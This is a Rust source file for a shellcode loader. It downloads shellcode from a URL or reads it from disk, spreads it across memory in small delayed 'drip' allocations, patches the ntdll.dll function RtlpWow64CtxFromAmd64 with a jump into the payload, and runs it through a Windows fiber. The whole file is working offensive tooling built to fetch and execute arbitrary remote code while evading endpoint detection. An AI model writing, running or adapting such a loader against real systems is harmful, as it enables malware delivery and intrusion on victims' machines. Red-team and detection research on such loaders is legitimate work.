#![allow(warnings)]
mod utils;
mod externs;
use std::{thread, env};
use std::ptr::{null, null_mut};


// Delay in milliseconds
pub static delay_mills: u64 = 500;
// Module and function to patch with jmp to shellcode
pub static mod_name: &str = "ntdll.dll";
pub static func_name: &str = "RtlpWow64CtxFromAmd64";



fn main() {

    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        println!("[!] Please provide location for the shellcode, either file path or URL");
        return;
    }
    let sc_location: String = args[1].clone();

    let mut shellcode: Vec<u8> = Vec::new();
    if sc_location.starts_with("http") {

        // Download from URL
        println!("[+] Downloading shellcode from: {}", sc_location);
        shellcode = utils::download_file(sc_location.as_str());

    } else {

        // Read the shellcode from a file on disk (for testing)
        println!("[+] Reading shellcode from a file: {}", sc_location);

        // The shellcode is read as a byte vector
        shellcode = match utils::read_file(sc_location.as_str()) {
            Some(sc) => sc,
            None => {
                return
            }
        };
    }

    if shellcode.is_empty() {
        return;
    }

    unsafe {

        let memAddr: Vec<externs::LPVOID> = utils::drip_alloc(shellcode);
        let addr = utils::prepare_jump(memAddr[0], mod_name, func_name);

        println!("[+] Preparing fiber to execute the patched {}", func_name);
        let fiber_start: externs::LPFIBER_START_ROUTINE = std::mem::transmute(addr);

        let t_hand = thread::spawn(move || {
            let main_fiber = externs::convert_fiber(null_mut());

            let sc_fiber = externs::create_fiber(0 as usize, fiber_start, null_mut());

            externs::switch_fiber(sc_fiber);
        });

        println!("[+] Shellcode should be running");
        t_hand.join();
    }
}